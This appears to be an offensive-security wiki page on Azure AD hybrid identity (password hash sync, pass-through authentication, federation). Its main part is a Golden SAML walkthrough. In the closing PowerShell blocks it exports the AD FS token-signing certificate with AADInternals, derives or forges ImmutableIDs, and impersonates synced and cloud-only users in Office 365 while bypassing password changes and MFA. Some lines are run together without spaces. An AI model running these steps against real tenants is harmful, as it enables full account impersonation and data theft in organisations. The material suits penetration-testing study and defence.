**On-premises AD** can be **integrated** with Azure AD using **Azure AD Connect** with the following **methods**. Every method supports Single Sign-on (SSO):

* Password Hash Sync (PHS)
* Pass-Through Authentication (PTA)
* Federation

For each method, at least the **user synchronization is done** and an account with the name**`MSOL_<installationidentifier>`** is created on the **on-prem AD**.

## PHS

{% content-ref url="phs-password-hash-sync.md" %}
[phs-password-hash-sync.md](phs-password-hash-sync.md)
{% endcontent-ref %}

## PTA

{% content-ref url="pta-pass-through-authentication.md" %}
[pta-pass-through-authentication.md](pta-pass-through-authentication.md)
{% endcontent-ref %}

##

## Federation

* Trust is established between unrelated parties like on-prem Active Directory and Azure AD.
* In Federation, all authentication occurs in the on-prem environment and the user experiences SSO across all the trusted environments.
* Users can access cloud applications by using their on-prem credentials.
*
  * In any federation setup there are three parties: ‚Äì User or Client\
    ‚Äì Identity Provider (IdP)\
    ‚Äì Service Provider (SP)
  * The identity provider authenticates the user and then the user can access a service on the service provider.
  * Security Assertion Markup Language (SAML) is used for exchanging all the authentication and authorization information between the providers.
  * For more info [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

If an attacker can compromise the identity provide he can authorize anything



* AD FS is a claims-based identity model.
* "..claimsaresimplystatements(forexample,name,identity,group), made about users, that are used primarily for authorizing access to claims-based applications located anywhere on the Internet."
* Claims for a user are written inside the SAML tokens and are then signed to provide confidentiality by the IdP.
* A user is identified by ImmutableID. It is globally unique and stored in Azure AD.
* TheImmuatbleIDisstoredon-premasms-DS-ConsistencyGuidforthe user and/or can be derived from the GUID of the user.
* More info in [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML attack:**

* In ADFS, SAML Response is signed by a token-signing certificate.
* If the certificate is compromised, it is possible to authenticate to the Azure AD as ANY user synced to Azure AD!
* Just like our PTA abuse, password change for a user or MFA won't have any effect because we are forging the authentication response.
* The certificate can be extracted from the AD FS server with DA privileges and then can be used from any internet connected machine.
* More info in [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### From on-prem to cloud

```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

It's also possible to create ImmutableID of cloud only users and impersonate them

```powershell
#¬†Create a realistic ImmutableID and set it for a cloud only user 
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
